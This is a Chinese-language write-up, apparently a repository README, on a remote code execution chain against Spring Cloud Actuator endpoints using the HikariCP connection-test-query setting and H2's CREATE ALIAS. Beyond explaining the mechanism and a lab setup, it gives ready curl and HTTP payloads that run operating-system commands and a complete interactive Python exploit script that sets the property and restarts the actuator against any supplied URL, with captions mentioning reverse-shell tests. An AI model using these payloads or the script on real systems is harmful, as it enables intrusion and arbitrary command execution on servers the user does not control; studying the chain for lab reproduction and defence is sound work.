# SpringCloud-Actuators-HikariCP-H2-database-RCE-payload



> 本篇文章复现与分析SpringCloud Actuator/HikariCP/H2利用链的RCE方法主要以SpringBoot2.x版本为主。原因是SpringBoot2.0开始，HikariCP数据库连接池成为SpringBoot的默认连接池，操作空间更大。另外，SpringBoot1.X如果环境足够也可以进行RCE，方法步骤相同，只是Actuator端点和传递参数的Content-Type有区别。
>
> **文章末尾的PoC/Exp脚本支持SpringBoot1.X和2.X两个版本的利用。**

# 一、漏洞利用条件：

## 1、目标Web应用使用了HikariCP 数据库连接池（Spring2.x默认使用）

## 2、目标Web应用使用了H2数据库

```xml
<dependency>
    <groupId>com.h2database</groupId>
    <artifactId>h2</artifactId>
    <scope>runtime</scope>
</dependency>
```

## 3、/actuator/env 接口允许使用POST设置应用程序的环境变量。

```http
POST /actuator/env HTTP/1.1
Content-type: applicaiton/json

{"name":"<NAME OF VARIABLE>","value":"<VALUE OF VARIABLE>"}
```

## 4、/actuator/restart 接口允许使用POST方法重启actuator环境。

# 二、环境搭建：

## 1、Docker环境

```sh
git clone https://github.com/spaceraccoon/spring-boot-actuator-h2-rce.git
cd spring-boot-actuator-h2-rce
sudo docker build -t spaceraccoon/spring-boot-rce-lab .
sudo docker run -p 8080:8080 -t spaceraccoon/spring-boot-rce-lab
#执行上述命令后，springboot的环境被映射到本机8080端口。
```

## 2、源代码

```sh
git clone https://github.com/superboy-zjc/Vulnerable-environment.git
cd Vulnerable-environment/spring-boot-actuator-h2-rce/
java -jar springboot-h2-database-rce.jar
#默认在8080端口运行
```

# 三、漏洞利用原理：

## 1、利用条件之HikariCP数据库连接池

HikariCP是一个帮助WEB应用与数据库进行连接的连接池。它有一个配置项叫做：`connectionTestQuery`。它的作用是当一个WEB应用程序向HikariCP数据库连接池发送一个数据库连接请求时，HikariCP会首先执行这个配置项配置的SQL语句，来判断是否数据库可以正常被允许建立连接。这条配置项对应的SpringBoot环境变量名是：`spring.datasource.hikari.connection-test-query`。

因此，通过`POST /actuator/env`来设置`spring.datasource.hikari.connection-test-query`环境变量，然后，通过`/restart`端口重启应用程序上下文刷新数据库的连接，来激活这个配置项，实现执行任意SQL语句。

```http
POST /actuator/env HTTP/1.1
Content-type: applicaiton/json

{"name":"spring.datasource.hikari.connection-test-query","value":"SELECT 1"}
```

## 2、利用条件之H2 database数据库

通过H2数据库的一些小功能，我们可以联动起来达到RCE的效果。

H2数据库作为一个基于java开发的内存数据库，有着轻便、开源、速度快、提供友好的WEB界面、跨平台等等的优点。开发人员经常使用它来进行单元测试。由于其基于JAVA开发的特性，H2数据库提供了一些强大的兼容功能。其中之一就是`CREATE ALIAS`SQL语句。通过`CREATE ALIAS`的功能，你可以定义一个JAVA函数，用一个别名和它关联起来，然后在SQL语句中通过别名来调用执行它。

```sql
CREATE ALIAS GET_SYSTEM_PROPERTY FOR "java.lang.System.getProperty";	#创建别名函数GET_SYSTEM_PROPERTY
CALL GET_SYSTEM_PROPERTY('java.class.path');	#执行别名函数GET_SYSTEM_PROPERTY
```

因此，通过H2数据库`CREATE ALIAS`的特性，我们可以设置一个`Runtime.getRuntime().exec`方法的别名给HikariCP的`connectionTestQuery`配置项，然后通过`POST /actuator/env`来达到任意命令执行~

```sh
spring.datasource.hikari.connection-test-query=CREATE ALIAS exec_name AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL exec_name('命令');
```

## 3、利用条件之 Spring Cloud 对 /actuator/env 与 /actuator/restart POST方法的支持

从[<u>Spring Boot官方文档</u>](https://docs.spring.io/spring-boot/docs/1.3.1.RELEASE/reference/htmlsingle/#production-ready-endpoints)中可以看到，SpringBoot Actuator中并不支持POST方法对`/actuator/env`环境变量的设置，只支持GET方法来获取环境数据。并且也没有`/actuator/restart`端口功能。

因此只有[Spring Cloud](https://cloud.spring.io/spring-cloud-static/spring-cloud-commons/2.1.3.RELEASE/single/spring-cloud-commons.html#_endpoints)微服务应用程序的Actuator才有可能支持以上两个端口的POST方法。以下是Spring Cloud的官方文档节选：

> For a Spring Boot Actuator application, some additional management endpoints are available. You can use:
>
> - `POST` to `/actuator/env` to update the `Environment` and rebind `@ConfigurationProperties` and log levels.
> - `/actuator/refresh` to re-load the boot strap context and refresh the `@RefreshScope` beans.
> - `/actuator/restart` to close the `ApplicationContext` and restart it (disabled by default).
> - `/actuator/pause` and `/actuator/resume` for calling the `Lifecycle` methods (`stop()` and `start()` on the `ApplicationContext`).

# 四、漏洞利用方法：

> ⚠️ 注意：在SpringBoot运行期间，设置的别名(如下为EXEC别名)命名不能重复使用。如果设置的别名与某次别名相同，则restart后无法执行命令。另外，以下测试手段均有可能影响业务运行，请谨慎操作！

## 1、设置hikari数据库连接池的connection-test-query配置项

使用curl：

```sh
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'执行的操作系统命令\');\"}' 'http://localhost:8080/actuator/env'
```

或者发包：

```http
POST /actuator/env HTTP/1.1
Content-type: applicaiton/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('执行的操作系统命令');"}
```

## 2、重启actuator

使用curl：

```sh
curl -X 'POST' -H 'Content-Type: application/json' 'http://localhost:8080/actuator/restart'
```

或者发包：

```http
POST /actuator/restart HTTP/1.1
Content-type: applicaiton/json

```

# 五、PoC脚本

脚本实现了随机化设置别名，不会因为别名的重复而导致Spring服务出现问题。

```python
import requests
import argparse
import json
import sys
from lxml import etree
import string
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def spring_poc(url, command, version):
    if url[-1] != '/':
        url = url + '/'
    random_str = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k = 8))
    if version == 1:
        headers = {
            'Content-Type' : 'application/x-www-form-urlencoded'
        }
        data = """\
            spring.datasource.hikari.connection-test-query=CREATE ALIAS %s AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL %s('%s');\
            """ % (random_str, random_str, command)
    else:
        headers = {
            'Content-Type': "application/json"
        }
        data = """\
        {"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS %s AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL %s('%s');"}\
        """ % (random_str, random_str, command)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url = url+'env', data=data, headers=headers, timeout=10, verify=False)
        if command in response.text:
            print(colors.OKGREEN + 'hikari.connection-test-query  is successfully configured!' + colors.reset)
        else:
            print(colors.FAIL + 'hikari.connection-test-query configuration failed.' + colors.reset)

        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url = url+'restart', data="", headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
             print(colors.OKGREEN + 'Actuator restarted successfully!' + colors.reset)
        else:
            print(colors.FAIL + 'Actuator failed to restart.' + colors.reset)
        print(colors.OKCYAN + 'The command has been successfully executed!' + colors.reset)
    except Exception as e:
        print(colors.FAIL + 'Request exception.' + colors.reset)


class colors:
    reset='\033[0m'
    red='\033[31m'
    green='\033[32m'
    orange='\033[33m'
    blue='\033[34m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

if __name__ == '__main__':
    banner = (colors.red + r"""
  _________            .__              ___________               
 /   _____/____________|__| ____    ____\_   _____/__  _________  
 \_____  \\____ \_  __ \  |/    \  / ___\|    __)_\  \/  /\____ \ 
 /        \  |_> >  | \/  |   |  \/ /_/  >        \>    < |  |_> >
/_______  /   __/|__|  |__|___|  /\___  /_______  /__/\_ \|   __/ 
        \/|__|                 \//_____/        \/      \/|__|   
    """+ "\n" + colors.blue + "vuln: " + colors.orange + "SpringCloud h2 database & hikaricp RCE" + "\n" \
        + colors.blue + "group: " + colors.green + "WgpSec Team" + "\t\t" + colors.reset \
        + colors.blue + "author: " + colors.green + "2h0ng" + "\n" + colors.reset)
    print(banner)

    
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True,
        help="Spring Actuator Endpoint absolute path, example: https://example.com/actuator/")
    ap.add_argument("-v", "--spring-version", required=False,
        help="Spring Boot Version, example: -v (1/2), default 2", default=2, type=int)
    args = vars(ap.parse_args())
    
    while True:
        command = input(colors.red + "$command:>> " + colors.reset)
        if command == 'exit':
            sys.exit(0)
        spring_poc(args['url'], command, args['spring_version'])
```

## 1、curl语句出网测试：

![poc1.gif](https://cdn.nlark.com/yuque/0/2021/gif/12876037/1617365235007-0e16704e-616f-4952-a7c7-4d86a0337645.gif)

## 2、反弹shell测试：

![poc2.gif](https://cdn.nlark.com/yuque/0/2021/gif/12876037/1617365241397-500da393-b574-4016-a5f8-c882a7695b55.gif)

# 参考资料：

https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database

https://segmentfault.com/a/1190000020636564

https://github.com/LandGrey/SpringBootVulExploit#0x0crestart-springdatasourcedata-h2-database-rce
